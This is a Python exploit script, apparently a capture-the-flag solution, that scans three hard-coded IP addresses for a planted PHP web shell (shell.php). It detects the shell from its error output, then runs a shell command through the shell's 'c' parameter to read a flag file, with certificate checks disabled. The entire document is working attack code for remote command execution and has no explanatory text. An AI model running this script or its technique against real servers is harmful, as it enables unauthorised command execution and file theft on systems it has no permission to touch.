#!/usr/bin/env python3
import re
import sys
import urllib.parse

import requests


TARGETS = [
    "http://193.42.127.24",
    "http://159.194.209.128",
    "http://159.194.199.71",
]

FLAG_RE = re.compile(r"KubSTU\([^)]+\)")


def run_cmd(base_url: str, command: str) -> str:
    url = f"{base_url}/shell.php?c={urllib.parse.quote(command, safe='')}"
    response = requests.get(url, timeout=15, verify=False)
    response.raise_for_status()
    return response.text


def find_shell_target() -> str:
    for base_url in TARGETS:
        try:
            response = requests.get(f"{base_url}/shell.php", timeout=10, verify=False)
        except requests.RequestException:
            continue
        if "Undefined array key \"c\"" in response.text and "system()" in response.text:
            return base_url
    raise RuntimeError("shell.php not found on any target")


def main() -> int:
    requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]

    try:
        base_url = find_shell_target()
        output = run_cmd(base_url, "cat /var/www/html/data/flag.txt")
    except Exception as exc:
        print(f"[!] exploit failed: {exc}", file=sys.stderr)
        return 1

    match = FLAG_RE.search(output)
    if not match:
        print("[!] flag not found", file=sys.stderr)
        print(output)
        return 1

    print(match.group(0))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
